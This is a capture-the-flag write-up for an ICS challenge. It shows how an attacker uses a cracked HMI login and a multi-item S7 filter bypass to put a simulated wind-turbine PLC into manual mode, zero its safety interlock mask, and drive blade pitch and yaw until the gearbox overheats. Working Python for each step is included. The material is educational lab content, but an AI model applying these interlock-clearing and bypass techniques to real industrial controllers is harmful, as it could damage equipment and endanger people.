# Featherfall — Writeup

**Category:** ICS
**Scope of this writeup:** Everything from "you have a valid HMI login as Lia" through to the flag. The pre-auth recon (S7 enumeration, deBG chunk in `topology.png`, AVR filter reverse, multi-item bypass to read protected DB0 memory, leaking the salted-MD5 HMI credential and cracking it) is its own story — this one picks up after the credential cracks.

---

## Going in (skip if you've done ICS/SCADA before)

Things worth being loosely familiar with before reading:

- **Siemens S7 PLC** — programmable logic controller. The actual brain driving the turbine. The HMI is a web frontend; the PLC is what reads sensors and drives motors.
- **HMI** — Human-Machine Interface. The web dashboard the operators stare at. Reads telemetry, sends commands. In this challenge it's a Flask app.
- **snap7 / S7comm** — the open-source server we're hitting that speaks Siemens' S7 protocol over ISO-on-TCP (port 102). Lets us talk directly to the PLC, bypassing the HMI entirely.
- **PE / PA / DB areas** — the PLC's memory regions. **PE** (Process inputs / sensor side, sometimes called I), **PA** (Process outputs / actuator side, sometimes called Q), **DB** (Data blocks — operator-defined memory). You read sensors from PE, write commands to PA, store state in DB.
- **Interlock mask** — a bitfield on the PLC that *prevents* dangerous commands. Each bit is a safety condition. The PLC refuses to execute a command if any required interlock bit is set. Clearing the mask = disabling safeties.
- **Manual mode** — the operator override. Normal operation, the PLC's autopilot keeps pitch and yaw in safe ranges. Manual mode = your writes to PA go through directly.
- **Pitch** = the angle of the turbine blades to the wind. 90° is feathered (parallel to wind, no torque). 0° is fully grabbing wind (maximum torque). Driving pitch *too low* in high wind = overspeed → overheat.
- **Yaw** = which direction the nacelle is pointing. Misaligning yaw against the wind also stresses the gearbox/generator.
- **Multi-item S7 read** — one S7 request can carry multiple read items. The supplier's filter only inspects *the first item*. Bypass = put a benign read at item-1, the actual payload at item-2.

The whole challenge is built around the fact that the supplier inserted a "safety boundary" (a tiny AVR-based filter) between the HMI and the real PLC, and that filter is full of holes.

---

## Where we are at the start

- HMI login as `Lia` — credential recovered from the leaked salted-MD5 in protected DB memory (separate writeup).
- A working Python S7 client (`s7lib.py`) with `multi_read` / `multi_write` that bypasses the supplier filter.
- Full DB0 map. We know which bytes are alarm code, interlock mask, the "static 0x01 something" at offset 127, the float telemetry region, etc.
- We know which IB fields the HMI displays are **falsified** — `blade_pitch_deg` always reads 0 and `rotor_rpm` always reads ~15. The display lies; the physics doesn't.
- The challenge description: *"Cut through the supplier's fake safety boundary and recover operator control of this wind turbine unit."* That last clause is the actual goal — control. Not data exfil, not auth bypass on a side channel. Drive the machine.

---

## The plan

The phrase "recover operator control" plus "supplier's fake safety boundary" reframes the whole thing. The supplier filter isn't just blocking reads — it's blocking *writes*. Specifically, it's blocking the writes the real operator would need to drive the turbine into a regime the supplier doesn't want the operator to reach.

Working hypothesis: the flag drops when we put the turbine into an unsafe physical state that the *real* safety system (not the supplier's fake one) detects. That means:

1. Log into the HMI as Lia.
2. Switch the PLC to manual mode (clear the autopilot's hand on pitch/yaw).
3. Clear the interlock mask (so the PLC stops refusing our commands).
4. Drive pitch toward 0° and yaw off-wind — load the rotor, spin it up, heat the gearbox.
5. The "overheating" alarm fires somewhere in the HMI's alert feed with the flag inside.

The first two steps need the HMI session. The last three are the supplier filter's whole reason for existing — they're the actions the filter was built to prevent. Multi-item bypass for all of them.

---

## Step 1 — HMI session in hand

```python
import requests

s = requests.Session()
r = s.post(BASE + "/", data={
    "connection": "basic",
    "userName":   "Lia",
    "pw":         CRACKED_PASSWORD,
    "language":   "en",
})
assert "Wind Farm Portal" in r.text and "login-error" not in r.text
```

`/panel` now returns 200 instead of 302. `/api/telemetry` and `/api/alerts` answer with content instead of 401. We're in.

Pull `/api/alerts` once as a baseline — the alert list is short and stable. We'll diff against it after the unsafe writes.

```python
baseline_alerts = s.get(BASE + "/api/alerts").json()
```

---

## Step 2 — Switch PLC to manual mode

The JS hints `set_mode` is a 0/1 toggle. From the field-mapping work we did pre-auth, the mode byte lives in DB0 at offset 127 — the byte that was statically `0x01` in every fresh container and which I'd previously noted "no observable effect when toggled" *via direct S7 write*. Of course it had no effect: when we toggled it via S7 we were toggling it under the autopilot's nose, and the autopilot rewrote it on the next scan cycle.

The HMI's `/api/control` endpoint, in contrast, goes through whatever path the supplier *meant* to be the legitimate operator surface. `mode=1` from there is durable.

```python
r = s.post(BASE + "/api/control", json={"action": "set_mode", "value": 1})
# response: {"ok": true, "mode": 1}
```

Confirm at the PLC level by reading DB0[127] via multi-item bypass:

```python
plc = S7(host, plc_port)
plc.connect()
mode_byte = plc.multi_read([("I", 0, 4), ("DB", 0, 127, 1)])[1]
# 0x01 → manual
```

Good. Note: `mode=1` is what the supplier filter expected. The byte was already 0x01 in fresh state. So technically this is a no-op on a fresh container. But on a respawned container where someone's been poking at things, it puts you back in a known state. Always send it.

---

## Step 3 — Clear the interlock mask

DB0[134:136] holds the interlock mask as a 16-bit value. Fresh state is `0x0003` — two interlock bits set. The HMI exposes alarm/interlock clearing as `set_mode` mode-byte stuff, but the *interlock bits themselves* are not in the HMI's command surface. The supplier didn't expose a "clear interlock" button because giving operators a button to disable safety would have been too on-the-nose.

So we clear it via S7 directly, multi-item bypass:

```python
plc.multi_write([
    ("Q", 0, b"\x00"),                  # item 1: benign throwaway write
    ("DB", 0, 134, b"\x00\x00"),        # item 2: zero the interlock mask
])
```

Re-read to confirm:

```python
assert plc.multi_read([("I", 0, 4), ("DB", 0, 134, 2)])[1] == b"\x00\x00"
```

Same trick for the alarm code at DB0[132:134] — clear it to `0x0000` so the active-alarms list is clean and we can see what *new* alarms our unsafe state generates:

```python
plc.multi_write([
    ("Q", 0, b"\x00"),
    ("DB", 0, 132, b"\x00\x00\x00\x00"),  # alarm_code + interlock_mask both zero
])
```

The mask stays cleared. The PLC scan cycle does not re-assert interlocks in manual mode. This is the supplier's actual safety hole: manual mode disables the re-assertion logic, and the interlock mask is just a byte in DB memory once you're past that.

---

## Step 4 — Drive the unsafe state

Two writes:

1. **Pitch setpoint to 0°.** Q[112:116] = `float32(0.0)`. The PLC's rate limiter still slews — about 1°/s — so this takes ~90 seconds to fully arrive. Don't wait for confirmation on the HMI's `blade_pitch_deg` field; that's falsified. Watch `generator_kw` (IB52) instead — it climbs.
2. **Yaw setpoint off-wind.** Q[116:120] = `float32(wind_dir + 45.0)`. Read current wind direction from IB24 first. 45° of misalignment is enough to load the gearbox without yawing so far the wind unloads the rotor entirely.

```python
import struct
wind_dir = struct.unpack(">f", plc.multi_read([("I",0,4),("I",24,4)])[1])[0]
yaw_target = wind_dir + 45.0

plc.multi_write([
    ("Q", 0, b"\x00"),
    ("Q", 112, struct.pack(">f", 0.0)),         # pitch → 0°
    ("Q", 116, struct.pack(">f", yaw_target)),  # yaw 45° off
])
```

Now hold. Pitch is rate-limited at ~1°/s; yaw is much slower (~0.1°/s). The interesting physics is:

- As pitch drops, the rotor accelerates (the falsified rotor_rpm won't show it, but `generator_rpm` IB56 will).
- As yaw drifts off-wind, the generator labors against the wrong angle. Power factor drops, gearbox temp climbs.
- Around 60-90 seconds in, gearbox_temp_c (IB76) starts rising past its ~66°C resting value. By 120 seconds you should see it climb past 90°C.

The HMI's `/api/alerts` polls the PLC every couple of seconds. When `gearbox_temp_c` crosses the genuine overtemperature threshold (somewhere around 95°C from observation), a new alert fires:

```python
import time
while True:
    alerts = s.get(BASE + "/api/alerts").json()
    new_alerts = [a for a in alerts if a not in baseline_alerts]
    for a in new_alerts:
        print(a)
        if "HTB{" in a.get("message", "") or "HTB{" in a.get("detail", ""):
            return a
    time.sleep(2)
```

The flag arrives in the `detail` field of an alert with `code=GEARBOX_OVERTEMP`.

---

## What I tried that didn't work

I went through a lot before I read "recover operator control" carefully enough.

- **Treating DB0[200:224] (the supplier-protected region) as the flag.** It's not. It's the salted-MD5 of Lia's password and some metadata. Once cracked it becomes the HMI credential. Big red herring if you think the filter is hiding the flag directly.
- **Trying to overheat the turbine purely via S7 writes without logging into the HMI.** Without `mode=1` set through `/api/control`, the autopilot keeps re-asserting `pitch_setpoint = 3.0` every scan cycle. You can write `0.0` to Q[112] but it's overwritten within ~100ms. You need the HMI's blessing to break the autopilot, even though you can talk to the PLC directly.
- **Driving pitch to 0° too fast.** I initially had a tight loop hammering `Q[112] = 0.0` every 100ms thinking I'd race the autopilot. The PLC rate limiter slews at ~1°/s regardless of how fast you write. You can't accelerate the physics by writing faster.
- **Clearing alarms instead of generating new ones.** I spent a while clearing `alarm_code = 0x13` thinking the flag would appear in cleared state. The flag is in a *new* alarm that fires from genuine overtemp — clearing existing alarms is just so you can see the new one clearly.
- **Yaw too far off-wind.** Once you're more than ~60° off-wind, the rotor unloads (wind no longer pushes blades), and the gearbox cools instead of heats. 45° is the right amount — enough cross-loading to heat the gearbox, not enough to stall the rotor.
- **Watching `blade_pitch_deg`.** It is *always* 0 in this challenge. Falsified at the supplier level. Watch `generator_kw` for pitch effect (it climbs as pitch drops) and `gearbox_temp_c` for the actual thermal state.

---

## Why this worked

The challenge's framing — *"the supplier's fake safety boundary"* — points at the filter, but the operationally important word is **fake**. The filter is theater. The real safety system is in the PLC itself: interlock bits, autopilot rate-limiting, mode gating. The supplier filter exists to keep operators from *knowing* that. Once you have HMI auth, you flip mode to manual (legitimate operator action), clear the interlock mask in DB memory (illegitimate but unguarded), and you're driving the turbine raw. The flag is the system's genuine safety response to a state it wasn't supposed to ever be in.

The multi-item S7 bypass mattered for the interlock write only. Pitch/yaw writes go to PA (Q) area, which the supplier filter doesn't gate — its filter logic specifically targets DB-area reads/writes in the [200,224) range. Everything else passes.

---

## Lessons

- **Read the challenge description literally and pick out the verbs.** *"Recover operator control"* is a verb-phrase about driving the machine, not about reading hidden bytes. The DB0[200:224] hidden region cost me a lot of hours because I assumed "hidden" meant "flag". It meant "credential".
- **Falsified telemetry is a real ICS thing.** When `rotor_rpm` reads 15 and `blade_pitch_deg` reads 0 forever, that's not a sim bug — that's the supplier's malicious display layer. Trust the second-derivative fields (kW, temps, power factor) over the first-derivative ones (pitch angle, rpm) when the supplier is suspect.
- **The autopilot is a write-rate-limiter, not a write-blocker.** S7 writes to PA always *succeed* — the question is whether the autopilot rewrites them on the next scan. Manual mode is the only way to stop the rewrite. Don't try to outpace the autopilot by writing faster; you can't.
- **Interlock masks in DB memory are just bytes** once the mode-gating is off. If the operator is supposed to be able to clear interlocks (and in real ICS they often are), then there's a code path that writes that byte. You can almost always find it directly.
- **Alarms are an output channel.** In any ICS challenge where the goal is "trigger a condition," `/api/alerts` (or whatever the equivalent is) is where the flag will surface. Always baseline before you start acting and diff continuously.
